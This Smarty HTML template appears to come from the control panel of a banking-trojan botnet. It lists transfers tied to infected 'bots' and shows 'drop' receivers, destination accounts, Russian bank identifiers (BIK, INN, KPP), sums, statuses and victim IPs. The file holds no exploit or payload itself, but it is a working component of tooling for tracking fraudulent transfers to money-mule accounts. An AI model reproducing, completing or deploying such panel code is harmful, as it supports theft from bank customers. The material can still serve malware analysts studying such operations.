<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
var id_bot_{$rand_name} = '{$bot->id}';
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$lang.infod} {$drop->receiver}';
</script>
<table cellspacing="1" cellpadding="3" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th>{$lang.infodrop}</th>
    <th width="5%">{$lang.sume}</th>
    <th width="8%">{$lang.system}</th>
    <th width="8%">{$lang.status}</th>
    <th width="8%">{$lang.ip}</th>
    <th width="8%">{$lang.data}</th>
</tr>
{foreach from=$transfers item=item name=transfers}
{if $smarty.foreach.transfers.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="font-size:9px; text-align:left; padding-left: 20px">
    {getdi($item->info)}
    {$lang.bot}: <a href="#null" onclick="gbw('{$item->prefix}{$item->uid}');">{$item->prefix}{$item->uid}</a><br />
    {if $item->info->trans->docnum ne ''}Номер: {$item->info->trans->docnum}<br />{/if}
    {if $item->info->drop->name ne ''}{$lang.name}: {$item->info->drop->name}<br />{/if}
    {if $item->info->drop->receiver ne ''}{$lang.receiver}: {$item->info->drop->receiver}<br />{/if}
    {if $item->info->drop->destination ne ''}{$lang.destination}: {$item->info->drop->destination}<br />{/if}
    {if $item->info->drop->acc ne ''}{$lang.acc}: {$item->info->drop->acc}<br />{/if}
    {if $item->info->drop->from ne ''}{$lang.from}: {$item->info->drop->from}<br />{/if}
    {if $item->info->drop->to ne ''}{$lang.to}: {$item->info->drop->to}<br />{/if}
    {if $item->info->drop->vat ne ''}{$lang.vat}: {$item->info->drop->vat}%<br />{/if}
    {if $item->info->drop->other.kppb ne ''}{$lang.dkppb}: {$item->info->drop->other.kppb}<br />{/if}
    {if $item->info->drop->other.bik ne ''}{$lang.dbik}: {$item->info->drop->other.bik}<br />{/if}
    {if $item->info->drop->other.BnkKOrrAcnt ne ''}{$lang.dsbp}: {$item->info->drop->other.BnkKOrrAcnt}<br />{/if}
    {if $item->info->drop->other.inn ne ''}{$lang.inn}: {$item->info->drop->other.inn}<br />{/if}
    {if $item->info->drop->other.kppp ne ''}{$lang.dkppp}: {$item->info->drop->other.kppp}<br />{/if}
    {if $item->info->system->vat ne 0}{$lang.vate}: {$item->info->system->vat}<br />{/if}
    </th>
    <th>{if $item->info->system->sum ne ''}{$item->info->system->sum}{else}-{/if}</th>
    <th>{$systems[$item->system]}</th>
    <th>{if $lang.bss_status[$item->status]}$lang.bss_status[$item->status]{else}{$item->status}{/if}<br /><br />{if $item->passiv eq 1}Пасив{else}Актив{/if}</th>
    <th>{$item->ip}</th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>